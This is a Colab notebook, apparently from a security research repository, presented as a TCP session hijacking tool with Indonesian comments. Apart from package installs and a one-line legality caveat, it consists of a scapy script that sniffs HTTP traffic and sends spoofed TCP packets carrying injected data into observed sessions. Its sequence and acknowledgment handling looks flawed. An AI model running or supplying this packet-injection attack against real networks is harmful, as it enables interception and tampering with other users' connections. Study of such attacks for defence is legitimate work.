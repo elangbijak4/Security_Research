{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyMPfrifQ/P886sSMo+usTAi",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/elangbijak4/Security_Research/blob/main/Tool26_Almudaya_Simple_TCP_Session_Hijacking_Attack_MITM.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install scapy"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "8c8oJOcdru0l",
        "outputId": "400886b0-d22c-4d1b-f8e6-f9f799df69f4"
      },
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: scapy in /usr/local/lib/python3.10/dist-packages (2.5.0)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Pengujian Tool ini hanya dibenarkan jika menggunakan alamat legal yang disediakan oleh IANA (Internet Assigned Numbers Authority)"
      ],
      "metadata": {
        "id": "-J8qiAtAEFZv"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install libpcap"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "9sxUIaFUHQt3",
        "outputId": "ce0546e4-2b71-47cb-ded2-8b8de34c0c30"
      },
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: libpcap in /usr/local/lib/python3.10/dist-packages (1.11.0b8)\n",
            "Requirement already satisfied: setuptools>=68.2.2 in /usr/local/lib/python3.10/dist-packages (from libpcap) (70.2.0)\n",
            "Requirement already satisfied: pkg-about>=1.1.5 in /usr/local/lib/python3.10/dist-packages (from libpcap) (1.1.6)\n",
            "Requirement already satisfied: packaging>=24.1.0 in /usr/local/lib/python3.10/dist-packages (from pkg-about>=1.1.5->libpcap) (24.1)\n",
            "Requirement already satisfied: tomli>=2.0.1 in /usr/local/lib/python3.10/dist-packages (from pkg-about>=1.1.5->libpcap) (2.0.1)\n"
          ]
        }
      ]
    },
    {
      "source": [
        "!apt-get update\n",
        "!apt-get install -y libpcap-dev"
      ],
      "cell_type": "code",
      "metadata": {
        "id": "YX59OsvpH_x5"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from scapy.all import *\n",
        "\n",
        "def spoof_packet(packet):\n",
        "    if packet.haslayer(TCP) and packet.haslayer(IP):\n",
        "        # Menyaring paket berdasarkan kondisi tertentu (misalnya, port)\n",
        "        if packet[TCP].dport == 80:  # Contoh: Port 80 (HTTP)\n",
        "            # Mendapatkan alamat IP dan port dari sumber dan tujuan\n",
        "            src_ip = packet[IP].src\n",
        "            dst_ip = packet[IP].dst\n",
        "            src_port = packet[TCP].sport\n",
        "            dst_port = packet[TCP].dport\n",
        "\n",
        "            # Mencetak informasi tentang sesi yang di-hijack\n",
        "            print(f\"[+] TCP Session Hijacking detected from {src_ip}:{src_port} to {dst_ip}:{dst_port}\")\n",
        "\n",
        "            # Membuat paket palsu untuk di-inject\n",
        "            ack = packet[TCP].ack\n",
        "            seq = packet[TCP].seq\n",
        "            payload = b\"Injected Data Here\"  # Isi data yang akan di-inject\n",
        "            spoofed_packet = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags=\"PA\", ack=ack, seq=seq)/payload\n",
        "\n",
        "            # Mengirimkan paket palsu\n",
        "            send(spoofed_packet, verbose=0)\n",
        "\n",
        "# Memulai sniffing paket\n",
        "print(\"[*] Starting TCP Session Hijacking... Press Ctrl+C to stop.\")\n",
        "sniff(filter=\"tcp\", prn=spoof_packet, store=0)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Nv_IdhR3IwbP",
        "outputId": "208eef1b-78c3-433a-f1d1-2b175ee92cd4"
      },
      "execution_count": 7,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "[*] Starting TCP Session Hijacking... Press Ctrl+C to stop.\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<Sniffed: TCP:0 UDP:0 ICMP:0 Other:0>"
            ]
          },
          "metadata": {},
          "execution_count": 7
        }
      ]
    }
  ]
}